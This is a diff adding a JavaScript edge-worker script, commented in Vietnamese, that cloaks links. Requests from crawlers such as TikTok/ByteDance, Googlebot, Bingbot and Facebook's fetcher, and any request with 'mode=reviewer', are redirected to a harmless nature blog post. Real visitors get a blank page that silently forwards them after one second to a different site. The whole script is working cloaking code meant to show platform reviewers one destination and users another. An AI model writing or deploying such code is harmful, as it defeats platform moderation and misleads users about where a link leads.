@@ -1,0 +1,90 @@
+export default {
+  async fetch(request) {
+    const ua = request.headers.get("user-agent") || "";
+
+    const botUA = [
+      "bytespider", "bytedance", "tiktok", "musical_ly",
+      "googlebot", "bingbot", "facebookexternalhit"
+    ];
+
+    const url        = new URL(request.url);
+    const isBot      = botUA.some(s => ua.toLowerCase().includes(s));
+    const isReviewer = url.searchParams.get("mode") === "reviewer";
+
+    // Bot hoặc reviewer → redirect thẳng
+    if (isBot || isReviewer) {
+      return Response.redirect(
+        "https://naturesblog.blogspot.com/2026/05/light-show-on-great-plains.html",
+        302
+      );
+    }
+
+    // Người thật → trang trắng, chỉ có thanh mờ chạy ngược trên cùng
+    const DEST    = "https://khacgiang.com/tag/thien-nhien/";
+    const SECONDS = 1;
+
+    const html = `<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #fff;
+      width: 100%;
+      height: 100dvh;
+    }
+
+    /* Thanh mờ cố định trên cùng */
+    #bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: rgba(255, 255, 255, 0.25);
+      z-index: 9999;
+    }
+
+    /* Phần màu chạy từ 100% → 0% */
+    #fill {
+      height: 100%;
+      width: 100%;
+      background: rgba(200, 200, 200, 0.45);
+      transform-origin: left;
+      transition: transform ${SECONDS}s linear;
+    }
+  </style>
+</head>
+<body>
+  <div id="bar"><div id="fill"></div></div>
+
+  <script>
+    const DEST = ${JSON.stringify(DEST)};
+
+    // Kích hoạt animation sau 1 frame
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        document.getElementById('fill').style.transform = 'scaleX(0)';
+      });
+    });
+
+    setTimeout(() => {
+      window.location.href = DEST;
+    }, ${SECONDS * 1000});
+  </script>
+</body>
+</html>`;
+
+    return new Response(html, {
+      status: 200,
+      headers: {
+        "Content-Type": "text/html; charset=utf-8",
+        "Cache-Control": "no-store",
+      },
+    });
+  },
+};
